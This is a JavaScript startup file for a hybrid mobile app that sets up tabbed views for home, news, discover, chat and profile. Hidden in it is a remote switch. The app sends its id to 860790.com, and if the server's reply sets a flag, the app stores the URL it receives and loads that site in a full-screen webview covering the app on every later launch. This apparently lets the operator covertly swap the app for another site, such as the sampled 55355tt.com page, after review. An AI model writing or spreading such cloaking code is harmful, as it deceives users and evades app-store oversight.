mui.init();
mui.plusReady(function() {
	plus.runtime.getProperty(plus.runtime.appid, function(inf) {
		localStorage.setItem('appid', inf.appid)
		var code = localStorage.getItem('code');
		var url = localStorage.getItem('url');
		if(url && code == 1) {
			console.info(1);
			var fu = plus.webview.currentWebview();
			var news_wv_ = plus.webview.create(url, url, {
				bottom: "0px",
				top: "0px",
				popGesture: "none",
			});
			fu.append(news_wv_);
			return;
		}
		var ajax = new XMLHttpRequest();
		ajax.open('get', 'https://860790.com/v1/' + inf.appid);
		ajax.send();
		ajax.onreadystatechange = function() {
			if(ajax.readyState == 4 && ajax.status == 200) {
				var data = JSON.parse(ajax.response);
				//          var data = {"code":1,"msg":"请求成功","time":"1538644845","data":{"rflag":"1","rurl":"https:\/\/www.55355tt.com\/4048","uflag":"0","uurl":""}};
				if(data.data.uflag === '1') {
					localStorage.setItem('code', data.code)
					localStorage.setItem('url', data.data.rurl)
					var fu = plus.webview.currentWebview();
					var news_wv_ = plus.webview.create(data.data.rurl, data.data.rurl, {
						bottom: "0px",
						top: "0px",
						popGesture: "none",
					});
					fu.append(news_wv_);
					return;
				}
				if(data.code === 1 && data.data.rflag === '1') {
					localStorage.setItem('code', data.code)
					localStorage.setItem('url', data.data.rurl)
					var fu = plus.webview.currentWebview();
					var news_wv_ = plus.webview.create(data.data.rurl, data.data.rurl, {
						bottom: "0px",
						top: "0px",
						popGesture: "none",
					});
					fu.append(news_wv_);
					return;
				}
			}
		}
		//->页面创建
		var fu = plus.webview.currentWebview();
		var wv_list = [
			{
				url: "./views/home/home.html",
				id: "home",
			},
			{
				url: "./views/zixun/zixun.html",
				id: "zixun",
			},
			{
				url: "./views/faxian/faxian.html",
				id: "faxian",
			},

			{
				url: "./views/chat/chat.html",
				id: "chat",
			},
			{
				url: "./views/mee/mee.html",
				id: "mee",
			},
		];
		for(var i = 0, j = wv_list.length; i < j; i++) {
			var url = wv_list[i].url;
			var id = wv_list[i].id;
			if(plus.webview.getWebviewById(id)) continue;
			var news_wv = plus.webview.create(url, id, {
				bottom: "50px",
				top: "0px",
				popGesture: "none",
			})
			i === 0 ? news_wv.show() : news_wv.hide();
			fu.append(news_wv);
		}
		var ind = 'home';
		mui(".mui-bar").on('tap', '.mui-tab-item', function(e) {
					
			if(this.dataset.id === ind) return;
			plus.webview.getWebviewById(ind).hide();
			plus.webview.getWebviewById(this.dataset.id).show();
			ind = this.dataset.id;
			var id = localStorage.getItem('user_id');
			if(!id==null){
				
			}else{
				var wobj = plus.webview.getWebviewById(ind);
				wobj.reload(true);
			}

			
			
		});

	})
});